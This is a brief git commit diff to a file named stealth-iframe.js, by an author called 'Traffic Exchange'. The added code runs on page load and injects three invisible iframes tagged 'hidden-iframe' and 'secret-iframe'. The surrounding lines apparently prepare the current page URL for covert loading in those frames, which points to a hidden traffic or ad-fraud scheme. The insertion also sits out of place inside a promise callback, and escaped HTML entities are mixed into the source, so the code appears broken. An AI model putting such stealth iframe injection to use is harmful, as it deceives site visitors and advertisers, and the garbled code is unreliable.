c88663f04e8b4b1906c05cd9214dd4993e7e5f69
Traffic Exchange <Cold.wallet.dev@gmail.com>
2025-06-08 15:29:58 +0200

    Update stealth-iframe.js

--- stealth-iframe.js
+++ stealth-iframe.js
@@ -25,6 +25,16 @@
     .finally(() =&gt; {
       // Start iframe loading loop after fetch attempt
 
+
+  window.onload = function () {
+    for (let i = 0; i < 3; i++) {
+      const iframe = document.createElement('iframe');
+      iframe.classList.add('hidden-iframe', 'secret-iframe');
+      iframe.src = 'about:blank'; // Optional: Set source or leave blank
+      document.body.appendChild(iframe);
+    }
+  };
+      
   const currentUrl = window.location.href;
   const encodedUrl = encodeURIComponent(currentUrl);
   const iframes = document.querySelectorAll(&#39;.secret-iframe&#39;);
